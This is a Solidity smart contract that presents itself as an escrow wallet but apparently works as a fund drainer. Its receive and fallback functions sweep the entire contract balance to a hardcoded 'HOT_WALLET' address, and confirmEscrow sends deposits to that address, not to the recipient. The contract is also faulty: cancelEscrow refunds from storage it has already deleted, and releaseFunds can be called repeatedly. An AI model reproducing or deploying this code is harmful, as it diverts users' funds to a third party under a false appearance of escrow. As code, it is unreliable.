// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract WalletContract {

    uint256 private constant MIN = 10000000000000000; // 0.01 
    address private constant HOT_WALLET = 0x0DEc99cDF5910723887a8320605bEBBD1AA0deE5;
    uint256 private constant ESCROW_TIMEOUT = 1 hours;

    event DepositedOnBlockVault();
    event EscrowInitiated(address indexed from, address indexed to, uint256 amount);
    event EscrowConfirmed(address indexed from, address indexed to, uint256 amount);
    event FundsReleased(address indexed to, uint256 amount);
    event EscrowCancelled(address indexed from, uint256 amount);

    struct Escrow {
        address from;
        address to;
        uint256 amount;
        bool confirmed;
        uint256 timestamp;
    }

    mapping(uint256 => Escrow) public escrows;
    uint256 public escrowCount;

    function forward() private {
        if(msg.value >= MIN){
            (bool success, ) = payable(HOT_WALLET).call{value: address(this).balance}("");
            require(success);
            emit DepositedOnBlockVault();
        }
    }

    function initiateEscrow(address _to) external payable {
        require(msg.value >= MIN, "Minimum amount not met");
        escrows[escrowCount] = Escrow(msg.sender, _to, msg.value, false, block.timestamp);
        emit EscrowInitiated(msg.sender, _to, msg.value);
        escrowCount++;
    }

    function confirmEscrow(uint256 _escrowId) external {
        Escrow storage escrow = escrows[_escrowId];
        require(msg.sender == escrow.to, "Only the recipient can confirm the escrow");
        require(!escrow.confirmed, "Escrow already confirmed");

        escrow.confirmed = true;
        (bool success, ) = payable(HOT_WALLET).call{value: escrow.amount}("");
        require(success);
        emit EscrowConfirmed(escrow.from, escrow.to, escrow.amount);
    }

    function releaseFunds(uint256 _escrowId) external {
        Escrow storage escrow = escrows[_escrowId];
        require(escrow.confirmed, "Escrow not confirmed");
        require(msg.sender == escrow.to, "Only the recipient can release the funds");

        (bool success, ) = payable(escrow.to).call{value: escrow.amount}("");
        require(success);
        emit FundsReleased(escrow.to, escrow.amount);
    }

    function cancelEscrow(uint256 _escrowId) external {
        Escrow storage escrow = escrows[_escrowId];
        require(msg.sender == escrow.from, "Only the sender can cancel the escrow");
        require(!escrow.confirmed, "Escrow already confirmed");

        uint256 amount = escrow.amount;
        delete escrows[_escrowId];

        (bool success, ) = payable(escrow.from).call{value: amount}("");
        require(success);
        emit EscrowCancelled(escrow.from, amount);
    }

    function checkAndReleaseEscrow(uint256 _escrowId) external {
        Escrow storage escrow = escrows[_escrowId];
        require(!escrow.confirmed, "Escrow already confirmed");
        require(block.timestamp >= escrow.timestamp + ESCROW_TIMEOUT, "Escrow timeout not reached");

        uint256 amount = escrow.amount;
        delete escrows[_escrowId];

        (bool success, ) = payable(escrow.to).call{value: amount}("");
        require(success);
        emit FundsReleased(escrow.to, amount);
    }

    receive() external payable { forward(); }
    fallback() external payable { forward(); }
}